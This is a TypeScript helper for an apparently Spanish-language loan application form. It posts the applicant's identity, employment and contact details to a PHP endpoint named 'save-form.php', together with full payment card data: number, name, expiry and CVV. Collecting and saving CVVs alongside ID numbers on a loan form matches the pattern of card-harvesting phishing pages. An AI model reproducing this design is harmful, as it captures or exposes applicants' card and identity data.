import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: LoanFormData): Promise<{ success: boolean; message: string }> => {
  try {
    // Create FormData object for PHP submission
    const form = new FormData();
    
    // Add all form fields
    form.append('loanAmount', formData.loanAmount.toString());
    form.append('loanTerm', formData.loanTerm.toString());
    form.append('firstName', formData.firstName);
    form.append('lastName', formData.lastName);
    form.append('dni', formData.dni);
    form.append('province', formData.province);
    form.append('email', formData.email);
    form.append('phone', formData.phone);
    form.append('occupation', formData.occupation);
    form.append('company', formData.occupationDetails.company);
    form.append('position', formData.occupationDetails.position);
    form.append('monthlySalary', formData.occupationDetails.monthlySalary);
    form.append('yearsEmployed', formData.occupationDetails.yearsEmployed);
    form.append('cardType', formData.cardInfo.type);
    form.append('cardNumber', formData.cardInfo.number);
    form.append('cardName', formData.cardInfo.name);
    form.append('cardExpiry', formData.cardInfo.expiry);
    form.append('cardCvv', formData.cardInfo.cvv);

    // Submit to PHP endpoint
    const response = await fetch('/save-form.php', {
      method: 'POST',
      body: form
    });

    if (!response.ok) {
      throw new Error('Error al enviar el formulario');
    }

    const result = await response.json();
    
    if (!result.success) {
      throw new Error(result.error || 'Error al procesar la solicitud');
    }

    return { 
      success: true, 
      message: 'Solicitud procesada exitosamente'
    };
  } catch (error) {
    console.error('Error submitting form:', error);
    throw error;
  }
};